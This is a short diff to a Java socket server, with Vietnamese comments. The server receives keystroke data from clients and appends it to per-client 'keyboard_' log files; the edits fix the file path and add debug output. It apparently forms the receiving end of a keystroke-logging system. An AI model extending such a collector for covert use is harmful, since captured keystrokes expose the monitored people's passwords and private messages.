@@ -26,7 +26,6 @@ public void run() {
                 try {
                     serverSocket.setSoTimeout(2000); // 10 giây
                     Socket socket = serverSocket.accept();
-                    System.out.println("Có kết nối nè");
                     threadPool.submit(() -> handleClient(socket));
                 } catch (SocketTimeoutException e) {
                     // Không có kết nối mới trong 10 giây
@@ -51,9 +50,9 @@ public void run() {
                 System.out.println("Không nhận được ID client.");
                 return;
             }
-            String logFilePath = keyboardPath + "_" + processGetData.getCode() + "//keyboard_" + clientID + ".txt";
-            // Ghi dữ liệu vào file
-            try (FileWriter writer = new FileWriter(logFilePath, true)) { // Mở file ở chế độ "append"
+            String logFilePath = keyboardPath + "/_" + processGetData.getCode() + "/keyboard_" + clientID + ".txt";
+            System.out.println("đường dẫn lưu file " + logFilePath);
+            try (FileWriter writer = new FileWriter(logFilePath, true)) {
                 String keyStroke;
                 while ((keyStroke = reader.readLine()) != null) {
                     writer.write(keyStroke);
